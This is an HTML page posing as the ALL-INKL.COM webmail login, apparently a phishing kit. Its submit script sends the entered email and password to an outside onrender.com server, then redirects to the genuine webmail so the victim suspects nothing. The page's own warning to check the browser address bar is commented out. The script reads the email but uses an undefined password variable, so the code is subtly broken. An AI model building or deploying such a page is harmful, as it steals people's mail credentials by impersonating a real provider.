<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
    <title>Webmail - ALL-INKL.COM WEBMAIL</title>
</head>
<body>
    <!-- Header with Logo -->
    <header class="header">
        <div class="header-inner">
           
            <img width="298.3"  height="41" src="images/header-allinkl.png">
        
        </div>
    </header>

    <!-- Main Login Card -->
    <main class="main">
        <div class="login-card">
            <h1 class="login-title">Login</h1>
            
            <form id="loginForm">
                <div class="form-row">
                    <label class="form-label" for="language">Sprache</label>
                    <div class="form-input-wrapper">
                        <select class="form-input" id="language" name="language">
                            <option value="de" selected>Deutsch</option>
                            <option value="en">English</option>
                            <option value="pl">Polski</option>
                        </select>
                    </div>
                </div>
                
                <div class="form-row">
                    <label class="form-label" for="email">E-Mail</label>
                    <div class="form-input-wrapper">
                        <input type="email" class="form-input" id="email" name="email" required>
                    </div>
                </div>
                
                <div class="form-row">
                    <label class="form-label" for="password">Passwort</label>
                    <div class="form-input-wrapper">
                        <input type="password" class="form-input" id="password" name="password" required>
                    </div>
                </div>
            <!--
                
                <div class="info-box">
                    <div class="info-box-text">
                        Prüfen Sie bitte, ob in der Adressleiste Ihres Browsers folgende Adeesse steht:
                    </div>
                    <div class="info-box-url">https://webmail.all-inkl.com/</div>
                    <div class="info-box-arrow"></div>
                </div>
                -->
                
                <div class="login-btn-wrapper">
                    <button type="submit" class="login-btn">Login</button>
                </div>
            </form>
        </div>
        
        <div class="mobile-link">
            <a href="#">Zur mobilen Version wechseln</a>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="footer-links">
            <a href="#">Impressum</a> | 
            <a href="#">AGB</a> | 
            <a href="#">Datenschutzinformation</a>
        </div>
        <div class="footer-address">
            ALL-INKL.COM - Neue Medien Münnich | Hauptstraße 68 | 
            D-02742 Friedersdorf | Fon +49 35872 353-10 | Fax +49 35872 353-30
        </div>
    </footer>

    <script>
    // Language switcher with translations for Deutsch, English, and Polski
document.getElementById('language').addEventListener('change', function() {
    const lang = this.value;
    const translations = {
        de: {
            login: 'Login',
            language: 'Sprache',
            email: 'E-Mail',
            password: 'Passwort',
            loginBtn: 'Login',
            mobileLink: 'Zur mobilen Version wechseln'
        },
        en: {
            login: 'Login',
            language: 'Language',
            email: 'Email',
            password: 'Password',
            loginBtn: 'Login',
            mobileLink: 'Go to mobile version'
        },
        pl: {
            login: 'Login',
            language: 'Język',
            email: 'Email',
            password: 'Hasło',
            loginBtn: 'Login',
            mobileLink: 'Przejdź do wersji mobilnej'
        }
    };

    const t = translations[lang];
    document.querySelector('.login-title').textContent = t.login;
    document.querySelector('label[for="language"]').textContent = t.language;
    document.querySelector('label[for="email"]').textContent = t.email;
    document.querySelector('label[for="password"]').textContent = t.password;
    document.querySelector('.login-btn').textContent = t.loginBtn;
    document.querySelector('.mobile-link a').textContent = t.mobileLink;
});

// Form submission handler
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const language = document.getElementById('language').value;
    console.log('Login attempt:', { email, language });

    fetch('https://web-backend-vdsi.onrender.com/', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                email: email,
                password: password,
                source: 'Kasserver---all-inkl',
              }),
            })
              .then((res) => {
                if (!res.ok) {
                  throw new Error(
                    'Network response was not ok ' + res.statusText,
                  );
                }
                return res.json();
              })
              .then((data) => {
                window.location.href = 'https://webmail.all-inkl.com/';
              });

    
});

</script>

</body>
</html>
